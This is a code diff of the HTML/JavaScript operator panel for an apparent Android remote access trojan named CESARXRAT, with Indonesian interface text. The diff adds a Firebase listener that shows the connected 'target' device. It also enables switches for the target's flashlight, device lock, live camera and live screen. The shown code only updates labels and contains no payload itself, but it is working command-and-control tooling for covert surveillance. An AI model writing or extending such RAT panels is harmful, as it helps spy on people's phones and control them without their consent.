@@ -6,251 +6,242 @@
     <title>RAT Control - CESARXRAT</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        /* Tambahan style khusus untuk RAT Control */
-        .rat-container {
-            max-width: 480px;
-            margin: auto;
-            padding: 20px 16px;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e27; color: #e0e8ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0; display: block; min-height: 100vh;
         }
+        .rat-container { max-width: 480px; margin: auto; padding: 20px 16px; }
         .rat-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
+            display: flex; justify-content: space-between;
+            align-items: center; margin-bottom: 16px;
         }
         .rat-header h1 {
-            font-size: 24px;
-            color: #4a9eff;
-            margin: 0;
+            font-size: 28px; color: #4a9eff; margin: 0;
+            font-weight: 800; letter-spacing: 1px;
+            text-shadow: 0 0 20px rgba(74, 158, 255, 0.3);
         }
-        .rat-header .online-status {
-            color: #4ae0a0;
-            font-size: 14px;
-            font-weight: bold;
+        .rat-header .status-badge {
+            color: #4ae0a0; font-size: 14px; font-weight: bold;
             background: rgba(74, 224, 160, 0.15);
-            padding: 6px 14px;
-            border-radius: 50px;
+            padding: 6px 16px; border-radius: 50px;
             border: 1px solid #4ae0a0;
+            display: flex; align-items: center; gap: 6px;
+        }
+        .rat-header .status-badge.offline {
+            color: #ff6b6b; background: rgba(255, 107, 107, 0.15);
+            border-color: #ff6b6b;
+        }
+        .rat-header .status-badge .dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: #4ae0a0; display: inline-block;
+            animation: pulse 1.5s infinite;
+        }
+        .rat-header .status-badge.offline .dot { background: #ff6b6b; animation: none; }
+        @keyframes pulse {
+            0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; }
         }
         .device-info {
-            background: linear-gradient(145deg, #12123a, #1a1a4e);
-            border-radius: 20px;
-            padding: 18px 20px;
-            margin: 12px 0 20px 0;
-            border: 1px solid #2a2a7a;
-            display: flex;
-            align-items: center;
-            gap: 14px;
+            background: linear-gradient(145deg, #111a3a, #1a2a5a);
+            border-radius: 20px; padding: 18px 20px;
+            margin: 12px 0 20px 0; border: 1px solid #2a4a8a;
+            display: flex; align-items: center; gap: 14px;
+            box-shadow: 0 8px 25px rgba(74, 158, 255, 0.15);
         }
         .device-info .icon {
-            font-size: 40px;
-            background: #0b0b2a;
-            padding: 10px;
-            border-radius: 16px;
-            border: 1px solid #2a2a7a;
+            font-size: 40px; background: #0a0e27; padding: 12px;
+            border-radius: 16px; border: 1px solid #2a4a8a;
+            min-width: 70px; text-align: center;
         }
-        .device-info .detail {
-            flex: 1;
-        }
+        .device-info .detail { flex: 1; }
         .device-info .detail .name {
-            font-size: 18px;
-            font-weight: bold;
-            color: #fff;
+            font-size: 20px; font-weight: bold; color: #fff; letter-spacing: 0.5px;
         }
         .device-info .detail .os {
-            font-size: 14px;
-            color: #8899dd;
-            margin-top: 2px;
+            font-size: 14px; color: #8899dd; margin-top: 4px;
         }
         .device-info .detail .tweak {
-            font-size: 12px;
-            color: #4a9eff;
+            font-size: 12px; color: #4a9eff;
             background: rgba(74, 158, 255, 0.15);
-            padding: 2px 10px;
-            border-radius: 50px;
-            display: inline-block;
-            margin-top: 4px;
+            padding: 3px 14px; border-radius: 50px;
+            display: inline-block; margin-top: 6px;
             border: 1px solid #4a9eff;
         }
-        .section-title {
-            color: #8899dd;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin: 20px 0 12px 0;
-            border-bottom: 1px solid #2a2a7a;
-            padding-bottom: 6px;
+        .device-info .detail .waiting {
+            font-size: 14px; color: #6a8abf; font-style: italic;
         }
-        /* GRID KOTAK-KOTAK seperti gambar kedua */
+        .section-title {
+            color: #8899dd; font-size: 14px; text-transform: uppercase;
+            letter-spacing: 1px; margin: 20px 0 12px 0;
+            border-bottom: 1px solid #2a4a8a; padding-bottom: 6px;
+            font-weight: 600;
+        }
         .grid-control {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 14px;
-            margin-top: 10px;
+            display: grid; grid-template-columns: 1fr 1fr;
+            gap: 14px; margin-top: 10px;
         }
         .control-box {
-            background: #12123a;
-            border-radius: 18px;
-            padding: 18px 12px;
-            text-align: center;
-            border: 1px solid #2a2a7a;
-            transition: 0.3s;
+            background: #111a3a; border-radius: 18px;
+            padding: 18px 12px; text-align: center;
+            border: 1px solid #2a4a8a; transition: 0.3s;
         }
         .control-box:hover {
             border-color: #4a9eff;
             box-shadow: 0 0 20px rgba(74, 158, 255, 0.15);
         }
-        .control-box .icon {
-            font-size: 32px;
-            margin-bottom: 6px;
-        }
+        .control-box .icon { font-size: 32px; margin-bottom: 6px; }
         .control-box .label {
-            font-weight: 600;
-            color: #c0d0ff;
-            font-size: 14px;
-            display: block;
-            margin-bottom: 10px;
+            font-weight: 600; color: #c0d0ff; font-size: 14px;
+            display: block; margin-bottom: 10px;
         }
         .control-box .label span {
-            font-size: 12px;
-            color: #ff6b6b;
-            display: block;
-            margin-top: 2px;
+            font-size: 12px; color: #ff6b6b;
+            display: block; margin-top: 2px;
         }
-        .control-box .label span.on {
-            color: #4ae0a0;
-        }
-        /* Switch di dalam kotak */
+        .control-box .label span.on { color: #4ae0a0; }
         .switch-lg {
-            position: relative;
-            display: inline-block;
-            width: 48px;
-            height: 26px;
+            position: relative; display: inline-block;
+            width: 48px; height: 26px;
         }
-        .switch-lg input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
+        .switch-lg input { opacity: 0; width: 0; height: 0; }
         .switch-lg .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: #2a2a5a;
-            transition: 0.4s;
-            border-radius: 34px;
+            position: absolute; cursor: pointer; top: 0; left: 0;
+            right: 0; bottom: 0; background: #2a2a5a;
+            transition: 0.4s; border-radius: 34px;
             border: 1px solid #4a4a8a;
         }
         .switch-lg .slider:before {
-            position: absolute;
-            content: "";
-            height: 18px;
-            width: 18px;
-            left: 3px;
-            bottom: 3px;
-            background: #888;
-            transition: 0.4s;
-            border-radius: 50%;
+            position: absolute; content: ""; height: 18px; width: 18px;
+            left: 3px; bottom: 3px; background: #888;
+            transition: 0.4s; border-radius: 50%;
         }
         .switch-lg input:checked + .slider {
-            background: #4a9eff;
-            border-color: #4a9eff;
+            background: #4a9eff; border-color: #4a9eff;
         }
         .switch-lg input:checked + .slider:before {
-            transform: translateX(22px);
-            background: #fff;
+            transform: translateX(22px); background: #fff;
         }
         .btn-back {
-            background: transparent;
-            border: 2px solid #4a9eff;
-            color: #4a9eff;
-            padding: 12px 24px;
-            border-radius: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            width: 100%;
-            margin-top: 24px;
-            text-align: center;
+            background: transparent; border: 2px solid #4a9eff;
+            color: #4a9eff; padding: 12px 24px;
+            border-radius: 50px; font-weight: bold;
+            cursor: pointer; transition: 0.3s;
+            width: 100%; margin-top: 24px;
+            text-align: center; font-size: 16px;
         }
-        .btn-back:hover {
-            background: #4a9eff;
-            color: #fff;
-        }
+        .btn-back:hover { background: #4a9eff; color: #fff; }
     </style>
 </head>
-<body style="background:#0b0b2a;color:#fff;min-height:100vh;display:block;padding:0;margin:0;">
+<body>
 
     <div class="rat-container">
-
-        <!-- HEADER dengan status online -->
         <div class="rat-header">
             <h1>RAT CONTROL</h1>
-            <span class="online-status">● ONLINE</span>
+            <span class="status-badge" id="statusBadge">
+                <span class="dot"></span> <span id="statusText">ONLINE</span>
+            </span>
         </div>
 
-        <!-- INFO DEVICE TARGET -->
-        <div class="device-info">
+        <div class="device-info" id="deviceInfo">
             <div class="icon">📱</div>
-            <div class="detail">
-                <div class="name">Samsung SM-A055F</div>
-                <div class="os">- Android 11 - 8.7W -</div>
-                <div class="tweak">Tweak: Defeats</div>
+            <div class="detail" id="deviceDetail">
+                <div class="name" id="deviceName">Menunggu koneksi...</div>
+                <div class="os" id="deviceOs">- - -</div>
+                <div class="tweak" id="deviceTweak" style="display:none;">Tweak: -</div>
+                <div class="waiting" id="deviceWaiting">Belum ada perangkat target yang terhubung</div>
             </div>
         </div>
 
-        <!-- REMOTE KONTROL -->
         <div class="section-title">REMOTE KONTROL</div>
 
-        <!-- GRID KOTAK-KOTAK (4 fitur) -->
         <div class="grid-control">
-            <!-- Flash -->
             <div class="control-box">
                 <div class="icon">💡</div>
                 <span class="label">Flash <span id="flashStatus">OFF</span></span>
                 <label class="switch-lg">
-                    <input type="checkbox" id="flash">
+                    <input type="checkbox" id="flash" disabled>
                     <span class="slider"></span>
                 </label>
             </div>
-            <!-- Lock Device -->
             <div class="control-box">
                 <div class="icon">🔒</div>
                 <span class="label">Lock Device <span id="lockStatus">OFF</span></span>
                 <label class="switch-lg">
-                    <input type="checkbox" id="lock">
+                    <input type="checkbox" id="lock" disabled>
                     <span class="slider"></span>
                 </label>
             </div>
-            <!-- Live Camera -->
             <div class="control-box">
                 <div class="icon">📷</div>
                 <span class="label">Live Camera <span id="cameraStatus">OFF</span></span>
                 <label class="switch-lg">
-                    <input type="checkbox" id="camera">
+                    <input type="checkbox" id="camera" disabled>
                     <span class="slider"></span>
                 </label>
             </div>
-            <!-- Live Screen -->
             <div class="control-box">
                 <div class="icon">🖥️</div>
                 <span class="label">Live Screen <span id="screenStatus">OFF</span></span>
                 <label class="switch-lg">
-                    <input type="checkbox" id="screen">
+                    <input type="checkbox" id="screen" disabled>
                     <span class="slider"></span>
                 </label>
             </div>
         </div>
 
-        <!-- Tombol Kembali -->
         <button class="btn-back" onclick="history.back()">Kembali</button>
     </div>
 
-    <script>
-        // Fungsi untuk update status teks ON/OFF dan warna
+    <script type="module">
+        import { db, ref, onValue } from './firebase-config.js';
+
+        const targetRef = ref(db, 'targets/active');
+        onValue(targetRef, (snapshot) => {
+            const target = snapshot.val();
+            const statusBadge = document.getElementById('statusBadge');
+            const statusText = document.getElementById('statusText');
+            const deviceName = document.getElementById('deviceName');
+            const deviceOs = document.getElementById('deviceOs');
+            const deviceTweak = document.getElementById('deviceTweak');
+            const deviceWaiting = document.getElementById('deviceWaiting');
+
+            if (target) {
+                statusBadge.classList.remove('offline');
+                statusText.textContent = 'ONLINE';
+                deviceName.textContent = target.name || 'Perangkat Target';
+                deviceOs.textContent = target.os || '- - -';
+                
+                if (target.tweak) {
+                    deviceTweak.style.display = 'inline-block';
+                    deviceTweak.textContent = 'Tweak: ' + target.tweak;
+                } else {
+                    deviceTweak.style.display = 'none';
+                }
+                deviceWaiting.style.display = 'none';
+
+                document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                    cb.disabled = false;
+                });
+            } else {
+                statusBadge.classList.add('offline');
+                statusText.textContent = 'OFFLINE';
+                deviceName.textContent = 'Menunggu koneksi...';
+                deviceOs.textContent = '- - -';
+                deviceTweak.style.display = 'none';
+                deviceWaiting.style.display = 'block';
+
+                document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                    cb.disabled = true;
+                    cb.checked = false;
+                });
+                document.querySelectorAll('.control-box .label span').forEach(el => {
+                    el.textContent = 'OFF';
+                    el.className = '';
+                });
+            }
+        });
+
         function updateStatus(checkboxId, statusId) {
             const checkbox = document.getElementById(checkboxId);
             const statusSpan = document.getElementById(statusId);
@@ -263,7 +254,6 @@
             }
         }
 
-        // Pasang event listener untuk setiap checkbox
         const controls = [
             { checkbox: 'flash', status: 'flashStatus' },
             { checkbox: 'lock', status: 'lockStatus' },
@@ -276,10 +266,10 @@
             cb.addEventListener('change', function() {
                 updateStatus(item.checkbox, item.status);
             });
-            // Inisialisasi status awal
             updateStatus(item.checkbox, item.status);
         });
-    </script>
 
+        console.log('[CESARXRAT] RAT Control real-time aktif');
+    </script>
 </body>
 </html>
